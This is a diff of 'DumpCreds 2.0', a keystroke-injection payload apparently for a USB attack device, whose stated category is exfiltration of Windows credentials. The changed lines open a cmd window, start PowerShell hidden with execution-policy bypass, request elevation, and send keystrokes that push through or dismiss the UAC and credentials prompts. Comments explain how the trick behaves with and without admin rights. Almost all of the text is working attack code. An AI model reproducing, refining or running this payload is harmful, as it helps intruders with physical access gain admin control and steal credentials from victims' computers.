@@ -2,9 +2,10 @@
 #
 # Title:         DumpCreds 2.0
 # Author:        QDBA
-# Version:       2.0.1
+# Version:       2.0.2
+# Build: 		 1001
 # Category:      Exfiltration
-# Target:        Windows XP SP3+ , 7, 10 (Powershell)
+# Target:        Windows Windows 7 + 10 (Powershell)
 # Attackmodes:   HID, Ethernet
 # 
 # 
@@ -55,17 +56,37 @@ Q SET_LANGUAGE DE
 Q DELAY 25000
 
 LED R G 100
-# Launch powershell as admin and deletes Run history
+# Launch initial cmd
 Q GUI r
 Q DELAY 1000
+Q STRING cmd /k mode con lines=1 cols=180
+Q DELAY 500
+Q ENTER
+
+
+# Launch powershell as admin and deletes Run history
+#Q GUI r
+Q DELAY 1000
 #Q STRING powershell -NoP -NonI -W Hidden -Exec Bypass -c "Start-Process cmd -A '/t:fe /k mode con lines=1 cols=180' -Verb runAs"
-Q STRING powershell -NoP -NonI -W Hidden -Exec Bypass -c "Start-Process cmd -A '/k mode con lines=1 cols=180' -Verb runAs"
+Q STRING start powershell -NoP -NonI -W Hidden -Exec Bypass -c "Start-Process cmd -A '/k mode con lines=1 cols=180' -Verb runAs"
 Q DELAY 500
 Q ENTER
 
 # Bypass UAC :: Change "ALT j" according to your language i.e. for us it is ALT o
+# Bypass UAC :: Change "ALT j" according to your language i.e. for us it is ALT o
+
+# With Admin rights the UAC prompt opens. ALT j goes to the prompt and the admin CMD windows opens. The ALT n goes to this Window (doesn't matter) than Enter for Newline
+# now the second powershell command goes to the admin cmd windows. 
+
+# With no Adminrights the the credentils prompt opens. ALT j doesn't do anything because there are no credentials. Then ALT n cancels the credentials propmpt. 
+# the second powershell command goes to the cmd Windows I open first. 
 Q DELAY 1000
 Q ALT j
+Q DELAY 500
+Q ENTER
+
+Q DELAY 1000
+Q ALT n
 Q DELAY 500
 Q ENTER
 
